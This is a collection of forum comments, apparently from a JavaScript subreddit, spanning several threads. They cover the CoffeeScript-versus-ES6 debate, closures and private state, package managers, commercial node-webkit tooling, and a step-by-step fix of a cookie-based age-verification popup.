I will come to my next question now, suppose I am using bower/npm for keeping my stuff with up to date with libraries and the end user downloads my stuff, but doesn't know how to use bower/npm, how things will work in that case? Can I program bower/npm to keep up to date with libraries automatically?
Thanks a lot! You're awesome! ^_^
Played a bit with Polymer.js and it's a nice view of the future. At the moment it's still alpha though so I wouldn't use it in production yet. I liked how you can isolate css but that's only works in browsers that support shadow dom. I would suggest making the boilerplate-element a bit more opinionated by adding a delivery method and a build step. This could be Component.js which has a build step that deals with js, css and assets. It adds commonjs modules as well which might or might not be a good thing. A Grunt plugin seems like a good option as well. It's more popular than component.js but it's missing a delivery method. That's not a big problem though since there is bower. Grunt also has a lot of libraries you can use so a custom plugin would probably be easy to make. 
An other cool purple site I saw last week: http://www.trask-industries.com Purple sites are the future!
I thought the same thing. I cloned the first one (appbar) just so I could get a look. Went to the demo dir, saw two HTML files, decided to browse to them. Nothing but a mess of CSS/Html on the screen. Nothing resembling a "bar". I'd love to see how these things were intended to look. Even a link to a demo in the Readme.md would be helpful.
What else can you do besides play casino games? I also didn't sign up. You posted a link to what looks like virtual casino games with absolutely no description or information. The only button on the linked page (other than Feedback) is Create Character. Linking to a homepage with a description of the game or at least a link to an About page would be helpful. I think the redditors here would probably be happier to talk about the development than play the game.
I have just added polyphony. http://chirp.rezoner.net/player/522775be631e72362f000002
&gt; I'm curious why you got that impression? Because you can't do anything without being immediately hit by a regwall! Please understand that I don't know a damn thing about you. Why the heck would I sign up after only being able to see other people walk around? If you let people play the games as a guest first, and had more instructions/information, I guarantee your conversions would go up. Also--this pisses me off: now that I've clicked on something and got hit by your huge regwall ("PLAY FREE NOW"), I can't go back and do ANYTHING else! Clicking on Home brings me to your CTA page, clicking on Play opens a lightbox to sign up, and Guide is just a game manual. You've obviously put a lot of effort into the tech here. Now it's time to put that same effort into the user experience, which frankly is terrible for new visitors. I'm sure it gets better for registered members, but I still haven't signed up because the whole thing leaves a bad taste in my mouth. Don't let your year of development and hard work go unnoticed simply because you have an obnoxious brick wall stopping people from playing your game.
I'm getting application error going to the URL, but going straight to the blog works: http://gaslight.co/blog/ But agree wholeheartedly with the article. The idea of coffeescript is for it to not be needed eventually, which is a good thing. As long as you just use coffeescript for "shorthand" JavaScript you should be fine - but one day we'll all be back on JavaScript (or another compile to language).
I've never really had any issues with coding in javascript that coffeescript could fix. never really understood "the point" so to speak. maybe that it makes writing object based code slightly easier? I don't find the current system very difficult myself. a lot of coffeescript just feels like its being different for different's sake. 
Sorry, heroku fail today!
Thanks for the feedback, much appreciated!
Love me some Coffeescript but agree with the sentiment. Nice to see Cincinnati represented on here, too.
I feel the same way. These guys have obviously worked hard on this, and they don't seem like some oppressive AAA studio, but still, this is the wrong place for this type of post. /u/GoldFire33, you guys should write up a technical blog post describing the unique challenges you faced when developing this game, and what you did to get past them. That would go over much better on /r/javascript. Create quality, genuine, original content, and you'll get the attention you're looking for.
no
I started to understand js via coffeescript, probably sass and scss will survive but cs is an extra step and the lacks of braces is a pain.
No.
The things that really make Coffeescript nice (class syntax, etc) are going to be a part of the JS spec soon. IMO, coffeescript is doomed, not because it is terrible, but because it doesn't offer anything significant to the table. It is javascript with a tweaked syntax to the authors preference.
Thanks for the response (and sorry for the late reply). I understand these are the two most popular methods (or variations of them), but I'm saying I'm not particularly fond of either. I was just hoping somebody had the "silver bullet" and something I had overlooked. 
Angularjs
Why does that imply that coffeescript is doomed? I don't see it ever becoming a defacto standard but even after ES6 proliferates it will still be significantly different. I write in CoffeeScript because I enjoy it more than JavaScript. I don't claim that it's inherently better in any way, just different, and it's entirely up to the programmer and team to decide what they like to write and what they feel most productive in. There will always be people who prefer one language or another for as long as people are different from each other. So why would coffeescript be doomed for any reason?
What drawback(s) can you see with Resig's system?
They copied a lot of Coffeescript stuff but not all and left out the biggest thing for me which is the lack of curly braces.
CS makes quite a few significant improvements. The biggest one is less code which has been proven to be very key to reducing bugs in software engineering. The reason you aren't able to recognize the advantages is something called status quo bias and also the fact that you haven't learned CS. For evidence of how much an improvement CS is, look at all of the features from CS taken into ES6. Some of the most important features though like significant whitespace which in fact was a major advance and a huge win for languages like Python and CS, is not in ES6. Its not because its not an improvement, its just that they know its too big of a change for compiler/interpreter writers and ordinary JS developers to accept.
I mostly don't like the constructor being a special case and the way _super is used is strange. I'd rather use the "pseudo-classical" approach over this.
Having worked with CoffeeScript, Javascript, Typescript, and a bit of ES6 Javascript, I believe that JavaScript will be way forward after ES6 (with TypeScript following close behind). I believe this exactly for two reasons the article list: JavaScript is the Lingua Franca and ES6 adds a lot of functionality that makes coding straight JavaScript so much more sensible. &lt;tangent&gt; I mention TypeScript mostly because after working with raw JavaScript and Typescript, that compile time sanity checking is amazing. Many JavaScript developers and other dynamic language connoisseurs may frown upon types, but being able to lean on a type system makes life a lot easier once you get any substantial amount of code. &lt;/tangent&gt;
Having a single place where finding all the common libraries, but also a central system which allow you to publish your own packages. Bower not only offer the standard libraries, but also many user contributes modules. The installation also cover updating and checking for dependencies or duplicates. If, for example, a library requires underscore, the installation process take care of this automatically as long as the package creator specify this behavior. On the server side it is pretty common to modularize functionalities into small packages, that is the way people can share their efforts avoiding to build every time the same things. On the client side, the new W3C web component specification is going toward the same path. 
I would have a button and inside that button I would create sub elements for each text label that it can have. Then create CSS classes for each text label. &lt;button class='btn btn_is-off'&gt;&lt;span class="btn_label-on"&gt;ON&lt;/span&gt;&lt;span class="btn_label-off"&gt;OFF&lt;/span&gt;&lt;/button&gt; Once the button is clicked add a class to it which toggles the text label you want.
come on, most of that features taken into ES6 are just sintax sugar. As coffeescript, in fact :D
I think CS is a good bridge for someone who comes from ruby or python to get into JS... but once your brain get used to the new ways, what's the point?
There's a big difference between ES6 having a standards document and ES6 being a practical thing to use. IE8 and friends are not going to disappear tomorrow.
significant whitespace is just a bad idea, imo. braces are superior because they are way more explicit and easier to debug.
Eh, I've been using regexps for years, it's fine as long as you have clean input. I wouldn't dream of parsing full HTML this way, it's only used to perform a surgical set of scans and manipulations. You just use non-greedy operators and account for possible quoting styles. As long as you don't write &lt;script attr="&gt;"&gt; it should be fine. You could replace this with DOM manipulation though: insert the inert scripts, and then parse them out using querySelector. I don't know if it would be much slower, but I simply didn't need it. It would probably also lead to browser differences, which I wanted to avoid.
yeah more or less.. i dont like the fact it doesnt use plain handlebars, polluting html attributes with loop or worse is horrible
I actually like the language paradigm of JavaScript, which is why I didn't choose a different compile to language. I didn't want to lose closures or ubiquitous first class functions. What would you consider a feature that isn't present in javascript that's in a different compile to language? I consider most of the changes in coffeescript to be features. Splats, comprehensions, having everything resolve to an expression, function binding, classes, inheritance, super, destructuring, chained comparison, and string interpolation are all features and not mere syntactic changes to me. If you're saying that they're not features because they can be implemented in javascript, then that's true of all compile to languages, because if a language can compile to javascript, all of its features can inherently be implemented in javascript. If I'm wrong about that, I would appreciate it if you could provide me an example of what you consider a feature from a different compile to javascript language.
Does it have to have one? It is a pretty damn awesome experiment and has been a hugely influential force on the landscape of javascript's development as a language. 
i wouldn't say either are "superior" its just personal preference... but nothing worth making a new language over.
&gt; IE8 and friends [IE11 and friends](http://kangax.github.io/es5-compat-table/es6/). IE10 and IE11 do support ES5.1 though.
I don't know, but to their credit the CS community/devs have obviously been aware of the issue and put some thought into it. When the issue was raised on HN a bit back, jashkenas responded [thusly](https://news.ycombinator.com/item?id=6079709). Likewise you can find discussions [here](https://github.com/jashkenas/coffee-script/issues/2638), [here](https://github.com/jashkenas/coffee-script/issues/3073), [and here](https://github.com/jashkenas/coffee-script/pull/3078) as well as a bunch of other places I'm sure.
looks like just a typo: `firstTimeHappend`
http://mgwis.tumblr.com/post/60188921921/in-the-last-5-years-w3c-specification-growth-has
bicknellr has the right solution to your problem, but I'd also recommend a different approach using jQuery's ``one`` functionality. $('.dataCard').draggable({axis: 'x', revert: true}); $('.dataCard').one('drag', function (event, ui) { event.preventDefault(); alert('First time drag.'); }); jQuery will take care of having only the first event be handled. If you need different behavior on every drag after the first, you could add a different handler from inside the ``drag`` handler.
&gt; The biggest one is less code which has been proven to be very key to reducing bugs in software engineering. This is a false statement. 
As somebody who loves both Javascript and Python, I have to disagree. Neither is superior to the other.
i think significant whitespace is more explicit than braces. it forces you to think about your code layout and enforces a good habit. you need to be very explicit in how to write your structure. you need to explicitly put spaces in order for the file to run correctly. even a novice python dev lays out a .py correctly, because they have to. it's much easier to look at a properly formatted .py and see where you're at based on space/indentation, than it is a java file with poorly laid out code. i'm not so sure braces are easier to debug either... not when you've got folks ending a section of code in multiple curly braces because it was easier than hitting tab or space. i'm not saying it's the best way to do things. i just don't think your reason braces are better is on point.
I personally have hated CoffeeScript since it came out, primarily because I find the syntax awful. But that's subjective. I did give TypeScript a college try, though, because it had a more c-like syntax. I was not impressed. I would rather use JavaScript the way it is. Too many times I found myself just ignoring TypeScript's features because they got in the way of doing things that feel "right". JavaScript is one of the most powerful languages ever made because of all of those quirks that people keep trying to remove with languages like CoffeeScript and TypeScript. 
all the wrong reasons :( CoffeeScript's future is limited because it offers no compelling story for how developers will write better code faster with less bugs, just a lot of hand-waving about readability and "javascript- the good parts". The other big player in this landscape is ClojureScript, which has a brilliant community chock full of ways to write better code, like immutability and functional programming and macros.
Agreed. It's just as easy to write a concise bug as a verbose bug. And I find the verbose bugs easier to decipher, especially if I'm coming back to the code after some time has passed.
Heh... nothing annoys me more than "clever" code. One dude I work with absolutely loves this antipattern: var i = someArray.length; while(i--) { //... } Which, sure, will save you a check every loop. But then, when he needs to actually iterate in order, he *reverses* the array just to iterate backward. Drives me up the wall. 
I'll be blunt: I don't particularly care if Javascript adopts the features of CS; unless it completely adopts the syntax of CS, I won't switch back. The reason is really stupidly simple: CS saves me keystrokes at the moment. While I love the lack of braces / use of significant whitespace, I also happen to like that things like function definitions are less verbose. It eliminates a lot of the keyword noise and lets me just focus on what I'm writing, and (well-written) CS code I've found to be eminently more scannable. So yeah, there are people who are going to keep using it, and as other posters have mentioned, it's going to be a long time before ES6 is actually ubiquitous -- I'd guess a minimum of five years. It stands to reason that CS will adapt over that time period, too, to make use of ES6 and to provide sugar for more common idioms. I think it's a mistake to assume that CS diminishes in value because of ES6. Who knows what CS2 will bring?
I'm curious as to why one would use this over Mongoose?
Feeling charitable, haven't tested it but should work... &lt;script type="text/javascript"&gt; function age_verify(){ if (!/visited=yes/.test(document.cookie)){ return true; } var enter_btn = document.getElementById('over21'); var age_dlg = document.getElementById('age_verify'); age_dlg.style.display = 'block'; enter_btn.onclick = function(){ expiry = new Date(); expiry.setTime(date.getTime()+(10*60*1000)); // Ten minutes document.cookie = "visited=yes; expires=" + expiry.toGMTString(); age_dlg.style.display = 'none'; return false; }; return false; } window.onload = function(){ //other init code age_verify(); }; &lt;/script&gt;
&gt; all compile to languages Unless it is assembly, this is true for all languages. Has anyone wrote CS to JS plugin for browsers, so it is automatic?
Oops, get rid of the ! in the first if stmt.
[you know it!](http://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags/1732454#1732454)
&gt; I've never really had any issues with coding in javascript that coffeescript could fix. I've never had a problem I couldn't solve with coffeescript that I could only solve with javascript. Because coffeescript is just javascript. &gt; never really understood "the point" so to speak. There is not single point, there are many points to use coffeescript. Just like there are many points to use plain old javascript. Pick the right tool for the job. &gt; maybe that it makes writing object based code slightly easier? I don't find the current system very difficult myself. It doesn't force you to structure code into classes. It's optional. It's more of a macro for writing prototypical classes. That said, if functional programming is your style it doesn't prevent you from writing that either. It's just javascript. &gt; a lot of coffeescript just feels like its being different for different's sake. Indeed it does, most of them are stylistic choices about the way you write code. It's a whole bunch of sugar at the end of the day. Sugaring code is all about making it more desirable/pleasurable to work with. To quote the summary of coffeescript: *"CoffeeScript is a little language that compiles into JavaScript. Underneath that awkward Java-esque patina, JavaScript has always had a gorgeous heart. CoffeeScript is an attempt to expose the good parts of JavaScript in a simple way."* At the end of the day, coffeescript is just javascript. Changing your style is about choosing something that fits you better. Also Douglas Crockford: [JavaScript: The Good Parts](http://www.youtube.com/watch?v=_DKkVvOt6dk) does a great talk on the good parts of javascript.
Okay updated without the "!" &lt;script type="text/javascript"&gt; function age_verify(){ if (/visited=yes/.test(document.cookie)){ return true; } var enter_btn = document.getElementById('over21'); var age_dlg = document.getElementById('age_verify'); age_dlg.style.display = 'block'; enter_btn.onclick = function(){ expiry = new Date(); expiry.setTime(date.getTime()+(10*60*1000)); // Ten minutes document.cookie = "visited=yes; expires=" + expiry.toGMTString(); age_dlg.style.display = 'none'; return false; }; return false; } window.onload = function(){ //other init code age_verify(); }; &lt;/script&gt; Clicking "Yes" doesn't do anything now. The pop-up doesn't close
[Here](http://youtube.com/watch?feature=c4-feed-u&amp;amp;v=iA-TyEeBBio) is the non-mobile version of this site.
&gt; Hello nerds. Maybe not the best words to begin with. We all know it's probably true but lets stay classy.
 if(firstTimeHappend === false){ // first time has not yet happened alert("first drag"); firstTimeHappened = true;
&gt; I personally really dislike significant whitespace and lack of braces. This is why i'm adverse to learning python or ruby. Whitespace denoted block structure bothers me for some reason. 
Change var enter_btn = document.getElementById('over21'); To var enter_btn = document.getElementById('over21').firstChild;
yeah but you can see braces. it's fairly hard to tell the difference between a couple spaces and a tab by sight :) that said I haven't spent any time using such languages, so do you just assume (when, say, inheriting a project) that all whitespace is uniform because of the language requirements?
No dice :/ &lt;!--AGE VERIFY --&gt; &lt;div id="age_verify"&gt; &lt;div id="black_cover"&gt;&lt;/div&gt; &lt;div id="ageverify_box"&gt; Are you 18 years of age or older? &lt;div id="agebtn_contain"&gt; &lt;div id="over21"&gt;&lt;a href="#"&gt;Yes, I am 18 or older&lt;/a&gt;&lt;/div&gt; &lt;div id="under21"&gt;&lt;a href="http://disney.com/"&gt;No, I am under 18&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script type="text/javascript"&gt; function age_verify(){ if (/visited=yes/.test(document.cookie)){ return true; } var enter_btn = document.getElementById('over21').firstChild; var age_dlg = document.getElementById('age_verify'); age_dlg.style.display = 'block'; enter_btn.onclick = function(){ expiry = new Date(); expiry.setTime(date.getTime()+(10*60*1000)); // Ten minutes document.cookie = "visited=yes; expires=" + expiry.toGMTString(); age_dlg.style.display = 'none'; return false; }; return false; } window.onload = function(){ //other init code age_verify(); }; &lt;/script&gt; What's weird, is if I open it in incognito mode, it will work once, than if I refresh it won't work anymore; not sure if that means anything lol
Well if you have the cookie set the page should not show the age verification and I'm working under the assumption that the age verification is hidden by default. Should also be a var in front of the expiry variable in the click handler.
Okay view the source now, it's added and still doesn't work :(
Aha, found my error sorry about that, guess i should have ran my code before posting... Murphey's law and all that. var enter_btn.onclick = function(){ should be enter_btn.onclick = function(){ 
Second time I've heard ClojureScript mentioned as a serious alternative today.
Oh, we're done with feature detection now are we? "Works Best With iOS7, Download Now!" buttons should be right along.
I didn't check your cookie code and just copied it as is; entirely possible it has an error. var date = new Date(); date.setTime(date.getTime()+(30*24*60*60*1000)); var expires = '; expires='+date.toGMTString(); document.cookie = 'visited=yes'+expires+'; path=/'; try that instead of the first 3 lines in the click handler 
Environment detection has a high rate of misuse. Often times, folks will attempt to work around browser support problems by checking for the affected browser and doing something different in response. The preferred solution for those kinds of problems, of course, is to check for the feature, not the browser (ala [Modernizr](http://modernizr.com/)). However, that common misuse of device detection doesn't mean it should never be done. A library such as this one could be employed to change the interface of your web app such that it uses interaction patterns and UI elements common to the device it's being presented on. Android devices might get a slightly different treatment than Windows or iOS, for instance. In light of this, I think this library deserves a foreword talking about the dangers of misusing device detection and highlighting some use cases where it should be applied.
Okay here is the latest code with the update you listed above, does the same as before. (works the first time I click 'Yes' in a new browser or incognito, but then doesn't work when i refresh. Definitely something fishy with the cookies. &lt;script type="text/javascript"&gt; function age_verify(){ if (/visited=yes/.test(document.cookie)){ return true; } var enter_btn = document.getElementById('over21').firstChild; var age_dlg = document.getElementById('age_verify'); age_dlg.style.display = 'block'; enter_btn.onclick = function(){ var date = new Date(); date.setTime(date.getTime()+(30*24*60*60*1000)); var expires = '; expires='+date.toGMTString(); document.cookie = 'visited=yes'+expires+'; path=/'; age_dlg.style.display = 'none'; return false; }; return false; } window.onload = function(){ //other init code age_verify(); }; &lt;/script&gt;
New version of the function function age_verify(){ var age_dlg = document.getElementById('age_verify'); if (/visited=yes/.test(document.cookie)){ age_dlg.style.display = 'none'; return true; } var enter_btn = document.getElementById('over21').firstChild; age_dlg.style.display = 'block'; enter_btn.onclick = function(){ var date = new Date(); date.setTime(date.getTime()+(30*24*60*60*1000)); var expires = '; expires='+date.toGMTString(); document.cookie = 'visited=yes'+expires+'; path=/'; age_dlg.style.display = 'none'; return false; }; return false; } 
Awesome!! Basically perfect. The only thing I noticed was that while it's "loading" the age verification pops up while the loader is doing it's thing, but once the page is loaded it disappears. 
I kludge fixed the in the code, but you need to ideally fix that in the css to not show the main age div.
in your css to this (not sure why the # symbols aren't showing in what you pasted) #age_verify { width:100%; height:100%; position:fixed; top:0; left:0; z-index:1001; } change to #age_verify { width:100%; height:100%; position:fixed; top:0; left:0; z-index:1001; display:none; } 
nice function. just dropped into this thread, cleanly done.
Perfect!! That did it! You are my freaking hero! So where is the portion the sets how long the cookie is active if I ever need to change it?
&gt; cookie is active if I ever need to change it? The big multiplication is where it is, the first number is the amount of days to keep the cookie active.
Great, thank you again!
If that's your only reason you should give them a try anyway once you have a little time left. Coding style is such a minor aspect of any programming language.
completely agree that CS has been driven rails guys doing front-end 
... Ruby doesn't have enforced whitespace.
I just get a grey background on Firefox 23.0.1 with no add-ons. Same with Chrome 29.0.1547.62. Works great in IE9. (This is on Windows 7 x64.)
Download link at the bottom is broken. Should link to trial.zip not trail.zip
Thanks, I'm still working out the kinks. I need to get some more systems available to me so I can work out all of these issues. I sincerely appreciate the feedback.
I think it does. I'm a software engineer at Groupon and we've been writing a *lot* of CoffeeScript. So much in fact that we paid the entire [kickstarter](http://www.kickstarter.com/projects/michaelficarra/make-a-better-coffeescript-compiler) for Michael Ficarra to improve the compiler. And it's not like it's just Groupon. Github has gone to a 100% coffeescript codebase on the front-end and so have a lot of other bay area tech companies. CoffeeScript makes a lot of the nastier JavaScript problems impossible (e.g. == vs === problems, implicitly declaring variables in the global scope, etc...) The JavaScript it produces is also very performant. On the whole, I think it's worth the hassles of not yet having good source maps, CS debuggers, etc. That said, it's no silver bullet and certainly doesn't make up for not understanding JavaScript's prototype chains, keyword *this* and scoping rules. I think CoffeeScript has a bright future for the short to mid-term, but there is a threat of LiveScript or other challengers becoming more popular. While I don't think Dart will ever win, it's equally unlikely that CoffeeScript will ever get a native implementation like Dart has. Learn your JS well and just use CS as a convenience is the approach I'd take. 
It isn't if you want other people to work on the project. There are far more people who use/understand the "pure" javascript syntax, so choosing something like coffee script just increases the barrier to begin coding at a minimum - and makes the project significantly less appealing to those who strongly dislike the style.
You can't. `n` is a local variable in `function a`. If you do need access to it, it will have to be done inside `a`, i.e. you could do something like: function a() { var n; this.getN = function() { return n; }; } Or use [accessors if you are using JS 1.8.5+](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/get). Or maybe you want [defineProperty](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty)...
Both links already purple ;) So there is no 'class scope' as there is in C-type languages? Only local and global?
Oops. Fixed. 
There are no classes.
There are no explicit classes, but what is in place is supposedly leading up to a class-based JS in JS2.0 (supposedly), so I wondered
Certainly, but who's got time for that while debugging?
Personally I'm not wishing for a *class-based JS* and I hope it never happens. But that's just my opinion
Use a closure to wrap your code up perhaps. I personally like to call it modularizing your code: //create a function closure to start your "module" (function() { //n is in scope to the entire module, making it "private static-ish"; var n = 'blah'; function A(){ //constructor logic goes here } //create public prototype api A.prototype.doSomething = function() { //n is one function level up, you have access; }; //put A onto global path window.A = A; //close your closure and immediately invoke it to assign A to global path }()); This works if `n` is either "static" or "constant" amongst all usage of `A`. If you are hoping for private scope instance data to your prototype, Javascript doesn't really support that either with closures or prototypes. You're better off writing doc comments on those properties specifying they are "private" scope even if they are publicly accessible. There are accessor style properties in newer JavaScript engines. But that only allows you to set a property to be a combo of a getter/setter function. Not really changing access level. You can read up on that here: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty. Also, ES6 "classes" are really nothing more than syntax sugar for the above code and cleaner ways to use Object.defineProperty. Under the hood, it's still the same prototypes. Here's some advanced ways to ninja-ish-ly use functions and prototypes that may be what you're trying to do. The stuff in here is actually still relevant and workable: http://www.youtube.com/watch?v=DwYPG6vreJg&amp;list=TLj7p5nWNzdNs My last 2 cents, don't bother with some of the ninja scope. The module code up above is all I really use in production code patterns. Simple, clean, and doesn't box with how JavaScript prototypes work.
Site doesn't work that great on ipad.
It [happens by magic](http://www.html5rocks.com/en/tutorials/developertools/sourcemaps/) in the developer console if you tick the 'enable source maps' option. You see coffeescript, the browser runs JavaScript. Ignoring CoffeScript, though, it also works for minified/recompiled JS and so if you're using jQuery off the CDN, you can now get sensible stack traces if something goes wrong.
Why are you doing this? There are libraries out there that already handle this, and because dates and times are so difficult they will likely do a better job already. I quite like moment.js myself for Javascript... In particular, at first glance your code doesn't handle Leap time at all. They are complicated because of all of the special cases that crop up. It also doesn't handle timezones and daylight saving time. The time difference between Midnight and 6am on October 26th 2013 is 6 hours, but on October 27th 2013 it is 7 hours - except that is based on British Summer Time. Eastern Daylight Time they are both 6 hours and the 7 hour one doesn't happen until November 3rd 2013.
And it's almost unusable on my Windows Phone.
Sorry it sounded so harsh. The scripting itself is quite good.
And it's just plain annoying on PC.
I think perhaps the word 'scope' in this discussion is a bit confusing. You seem to be talking about information hiding more than scope, though scope in JavaScript can actually be made to do, sort of, what you want. In many OO languages you can distinguish between private and public variables (properties in js); methods of a class can access private variables but other classes can't. JavaScript doesn't support this; properties are public (though you could now wrangle something together with custom accessors). I think many OO languages also confuse the issue because they allow you to access 'this.n' as 'n', as if it's a local variable in your method. Really underneath a language like C++ still goes through 'this', though. Python is an OO language which makes this explicit (self.n), and so does JavaScript. You could forgo the use of prototype and do something like this: var createA = function() { var n = 2; return { getN: function() { return n; }, setN: function(v) { n = v; } }; }; myA = createA(); // no 'new'! console.log(myA.getN()); myA.setN(3); console.log(myA.getN()); This will work and will hide n, but then you can't use prototype for inheritance and such. This pattern is quite common in JavaScript code, and there are class-like libraries built on it that bring inheritance back I think. But I prefer the use of prototype myself, as I think that fits the language better (and may be slightly more efficient, but I haven't measured things). 
And I can't even open it on my calculator.
I realize this and I do plan on tackling python in the near future, but it will be something that I know will take some getting used to and probably annoy me for a bit. 
I... may have exaggerated your behavior for illustrative purposes. 
I didn't really want to include a full library for the simple functionality of showing a time difference. Timezones and daylight savings don't really need to be handled since this is just the time difference. It's the devs responsibility to make sure they are passing in dates that are appropriate for their time zone. It's true that months might occasionally be off a little given that some are a few days shorter than others. But bare in mind this is a rough estimate and saying '1 month ago' a day or two longer than is correct seems pretty passable to me. Again if I were to do exact dates or needed some functionality where I was doing some complicated date manipulation I would totally use moment.js. But if all I need is a simple date difference including an entire library seems overkill.
&gt; One might wonder why a browser exists at all when it follows the same set of standards. What?!
Busted! 
I like TideSDK, but the last build was Nov. 12th, quite a while ago. We'd contribute to it but its pretty loft with supporting Ruby/PHP and other scripting languages rather than just JavaScript. I should say Tint is based off of node-webkit, and the changes (minus the compiler) are pushed up to roger/intel.
Why not use a free, opensource alternative like [AppJs](https://github.com/appjs/appjs) or [Node Webkit](https://github.com/rogerwang/node-webkit) ? What makes Tint different compared to them?
Well Crap. I'll add hiring a competent designer/programmer for the website to my TODO list.
I dont understand the need to have the extra layer. All syntax sugar IMO. I've not been coding any slower or less able than my friends using coffeescript. I don't get what the hard-on about it is. I give even less of a shit about TypeScript. Rarely, if ever, has weak typing been a bug or an issue for me in any lang. 
We're focusing on adding features needed but difficult to add. For example * Transparent windows/frames (this requires heavy modifications to chromium's rendering sub-system) * MacOSX Notifications * Windows Ribbon Support * Packaging enhancements, resources are not zipped then appended to the executable as they are in node-webkit but embedded as executable resources. The performance hit of having to unzip all the resources on every application load is a burden and exposes all of the code/resources to the user for modification. * Bug fixes (e.g., false alarms on anti-virus software). * Screen resolution enhancements. * Better compositing performance in Chromium's renderer * One bundled application, current node-webkit on windows requires many DLL's/nw.pak to be placed next to it. * Easy to use build tool. That said, the company is open source, all of our changes are pushed up to node-webkit (and have been since its inception) but we have little control on what makes it into node-webkit's build. In addition, node-webkit is copyrighted by Intel which I assume is who is funding the development. Being open source/free, I can only assume this is done through Intel's good graces, and should those graces dry up if its use were to continue companies need assurances they can still get support for it. That's where we come in. Node-webkit is a great project and if that works, use it.
Would have bought a lot of these if the pricing was even close to reasonable. I'll wait til the cost comes down.
Oops, repo is at https://github.com/trevorlinton/node-webkit. I'll fork it off on the company page.
Tints $499.00 per seat is ridiculous so theres that.
thanks for the insight, I was lacking some perspective
It's commercial support for a year. Not that ridiculous at all. If you'd like a free option there's node-webkit which Tint is based on, i'd suggest using that, please do not download it if you don't want it.
"The JavaScript it produces is also very performant." ehhhhhhhhhh. I suppose it depends on how people code. My team uses a lot?of?question?marks? everywhere. I think CS lets people get sloppy. Also I hate the compilation step. You've taken a runtime language and turned it into a compiled language. Idiotic in my opinion. 
You should let the Javascript language designers know so they can roll back all the CoffeeScript inspired (read copied) changes.
It's essentially a string macro system, you can probably throw away most templating libraries.
What exactly is "rich hypermedia" anyways?
That sugar usually results in anywhere from 75% to 50% of comparable javascript. Personally I like doing other things besides coding.
 function a(){ this.n = 'foo'; } a.prototype.doSomething = function(){ console.log(this.n); };
This thread was mildly more interesting than it should have been.
That antipattern still bugs me, though.
if you keep setting it to itself then it will recurse infinitely. There are other ways though - you could just check to see if it's the first time set is called with something like: set: (function() { var first = true; return function (type) { if (!first) { return (first = true); } first = false; this.src = videos[index]; } })() which will work for all objects - DOM ones included
That was a very good video, thanks for the link. I watched and enjoyed the whole thing. But your statement is unfortunate. It's not the "only thing that's been proven about software development", nor has Greg Wilson even said that it was. I can only assume you meant at about 39:30 when he discusses code metrics and specifically states that code metrics are far less accurate in predicting the number of post-release bugs than simple lines of code. He's talking about predicting bugs that surface after release, not actually reducing bugs in a system. If you accept his citation, which I have no reason to doubt, lines of code is the most accurate form of measuring post-release bugs. But note: he made no statement as to how precise a line-of-code based prediction was, only that it was more accurate than other metrics like coupling, cyclomatic complexity, and so forth. What is that number? 100%? Of course not. 70%? Maybe. I certainly don't know. After I write this, I may go back and look up the source he cites to see if it provides an actual value. Regardless, stating that CoffeeScript is better because it reduces the number of lines of code and therefore reduces the number of post-release bugs is still an inappropriate statement. I can reduce the number of lines in ~~any~~ most languages to 1 line if I desire. Just to be quick about it, I'll run my stuff through a Javascript minifier. Does that guarantee I've reduced the number of bugs in that program? Of course not. If you won't take that argument, then consider going back to your video at 42:45, when Greg states that "[startups will] attribute [their success] to the fact that they chose ruby on rails and ignore the fact that they are religious about doing pre-commit code reviews for version control". Don't fall into the trap of "platform = success". That may be more for /u/runvnc rather than you. :) Bottom line: Reducing lines of code may reduce whatever number you calculate to predict your post-release bugs, but it won't actually reduce the number of bugs in your program. Only diligence can reduce the number of bugs you produce. You can call that something else, if you like -- call it process, or method, or whatever, but it boils down to diligence. **update** if I had to make a value statement as to *why* number of lines of code could correlate to number of post-release bugs, I'd have to go with common sense -- the larger your code base, the more likely you are to have made a mistake. Diligence may be the only way to reduce bugs in your program, but nobody can be an infallible /u/codejesus.
Here's something that may amuse you more: We both just got runner-up awards ([his](http://thedailywtf.com/Articles/OMGWTF2-The-MacGyver-Award.aspx), [mine](http://thedailywtf.com/Articles/OMGWTF2-Lipstick-on-a-Pig.aspx)) for the [OMGWTF 2](http://omg2.thedailywtf.com/) coding contest So we're both kinda guilty of writing crappy code. :p
Haha wow, that bumps it from _mildly interesting_ into the realm of _fairly interesting_!
I would dispute "powerful", but lets call it expressive and permissive. Sometimes a great combo!
While reading that I SHOULD have liked the accuracy of the text, but I MUST admit that I MAY have giggled at all of the MUSTs, MAYs, and SHOULDs.
I found the issue. It's a bug in my analytics provider's JS.. I'm talking with them right now to fix the issue. Sorry about that!
True. I suppose it depends on how you define "power". For me, flexible, expressive and permissive is powerful. For another, raw speed is powerful. Javascript certainly falls down there, even with V8 
I'm put off by the cost, but only because i don't have that much to spare. What price point do you think would change your mind?
Hasn't PayPal cut their funds yet?
Are `\w` and `\b` (and JS regex in general) ever going to have proper unicode support?
most of that code reduction advantage dissapear with some own boilerplate (or 3th party lib, whatever floats your boat... at the end, coffee isn't any more than a big big big boilerplate library conceptually) on your js project. And you introduce you another layer of abstraction that makes the project harder to debug and makes non expert js developers make assumptions that just aren't true just because that doesn't looks like js but python / rails / whatever. 
Excellent, very thorough. The examples are especially note worthy: it has the same logic rewritten in most asynchronous styles. I'm not sure about generators, its too early. Personally I moved from async to Q (promises), works everywhere today.
&gt; But your statement is unfortunate. It's not the "only thing that's been proven about software development", nor has Greg Wilson even said that it was. I can only assume you meant at about 39:30 when he discusses code metrics and specifically states that code metrics are far less accurate in predicting the number of post-release bugs than simple lines of code. You are correct. I misspoke. It's a little tricky to define "defect" but that's part of the challenge when talking about science. There has to be a baseline. Generally this is predictive for behavior. If you have 1 line of code (regardless of the fitness for the purpose of the original program), that line is it's own unit test. Therefore, you have 1 value to measure against. Generally you will have less failures when you reduce the lines of code, because you are less likely to release with untested behavior.
Below RaspberryPi. I can buy 3 *more powerful* devices that will do the same task and have more extensibility for the price of one Tessel. I understand they need funding, but I can wait. It's simply far too expensive. I have to assume once they get the ball rolling on production it could be profitable for $30, and modules could probably go as low as $5. I obviously have done no work to back up my statements, just going by what can be produced currently for similar prices.
